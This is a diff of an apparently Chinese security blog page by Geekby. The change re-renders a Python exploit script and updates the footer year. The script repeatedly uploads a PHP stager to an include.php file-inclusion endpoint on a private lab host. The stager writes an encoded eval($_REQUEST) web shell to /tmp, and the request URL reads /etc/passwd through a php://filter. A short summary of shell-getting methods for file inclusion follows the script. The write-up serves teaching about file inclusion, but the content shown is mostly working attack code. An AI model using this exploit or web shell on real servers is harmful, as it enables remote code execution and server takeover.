-    <span class="n">file_content</span> <span class="o">=</span> <span class="s1">&#39;&lt;?php if(file_put_contents(&#34;/tmp/ssh_session_HD89q2&#34;, base64_decode(&#34;</span><span class="si">%s</span><span class="s1">&#34;))){echo &#34;flag&#34;;}?&gt;&#39;</span> <span class="o">%</span> <span class="p">(</span>
-        <span class="n">webshell_content</span><span class="p">)</span>
-    <span class="n">phpinfo_url</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="si">%s</span><span class="s2">/include.php?f=php://filter/string.strip_tags/resource=/etc/passwd&#34;</span> <span class="o">%</span> <span class="p">(</span>
-        <span class="n">base_url</span><span class="p">)</span>
-    <span class="n">length</span> <span class="o">=</span> <span class="mi">6</span>
-    <span class="n">times</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">charset</span><span class="p">)</span> <span class="o">**</span> <span class="p">(</span><span class="n">length</span> <span class="o">/</span> <span class="mi">2</span><span class="p">)</span>
-    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">xrange</span><span class="p">(</span><span class="n">times</span><span class="p">):</span>
-        <span class="nb">print</span> <span class="s2">&#34;[+] </span><span class="si">%d</span><span class="s2"> / </span><span class="si">%d</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">times</span><span class="p">)</span>
-        <span class="n">upload_file_to_include</span><span class="p">(</span><span class="n">phpinfo_url</span><span class="p">,</span> <span class="n">file_content</span><span class="p">)</span>
-<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
-    <span class="n">generate_tmp_files</span><span class="p">()</span>
-<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
-    <span class="n">main</span><span class="p">()</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># -*- coding: utf-8 -*-</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">string</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">itertools</span>
+</span></span><span class="line"><span class="cl"><span class="n">charset</span> <span class="o">=</span> <span class="n">string</span><span class="o">.</span><span class="n">digits</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">letters</span>
+</span></span><span class="line"><span class="cl"><span class="n">host</span> <span class="o">=</span> <span class="s2">&#34;192.168.43.155&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">port</span> <span class="o">=</span> <span class="mi">80</span>
+</span></span><span class="line"><span class="cl"><span class="n">base_url</span> <span class="o">=</span> <span class="s2">&#34;http://</span><span class="si">%s</span><span class="s2">:</span><span class="si">%d</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">upload_file_to_include</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">file_content</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">files</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;file&#39;</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;evil.jpg&#39;</span><span class="p">,</span> <span class="n">file_content</span><span class="p">,</span> <span class="s1">&#39;image/jpeg&#39;</span><span class="p">)}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="n">files</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span> <span class="n">e</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">generate_tmp_files</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">webshell_content</span> <span class="o">=</span> <span class="s1">&#39;&lt;?php eval($_REQUEST[c]);?&gt;&#39;</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;base64&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&#34;base64&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&#34;base64&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">file_content</span> <span class="o">=</span> <span class="s1">&#39;&lt;?php if(file_put_contents(&#34;/tmp/ssh_session_HD89q2&#34;, base64_decode(&#34;</span><span class="si">%s</span><span class="s1">&#34;))){echo &#34;flag&#34;;}?&gt;&#39;</span> <span class="o">%</span> <span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="n">webshell_content</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">phpinfo_url</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="si">%s</span><span class="s2">/include.php?f=php://filter/string.strip_tags/resource=/etc/passwd&#34;</span> <span class="o">%</span> <span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="n">base_url</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">length</span> <span class="o">=</span> <span class="mi">6</span>
+</span></span><span class="line"><span class="cl">    <span class="n">times</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">charset</span><span class="p">)</span> <span class="o">**</span> <span class="p">(</span><span class="n">length</span> <span class="o">/</span> <span class="mi">2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">xrange</span><span class="p">(</span><span class="n">times</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span> <span class="s2">&#34;[+] </span><span class="si">%d</span><span class="s2"> / </span><span class="si">%d</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">times</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">upload_file_to_include</span><span class="p">(</span><span class="n">phpinfo_url</span><span class="p">,</span> <span class="n">file_content</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">generate_tmp_files</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">main</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h2 id="5-总结">5 总结</h2>
 <p>当一个目标存在任意文件包含漏洞的时候，但找不到可以包含的文件，无法 getshell。可以有三种方法：</p>
@@ -673,7 +673,7 @@ include &#39;/var/lib/php/sessions/sess_iamnotorange&#39;;
 </div>
 </article></div>
             </main><footer class="footer">
-        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
         </div>
     </footer></div>
 
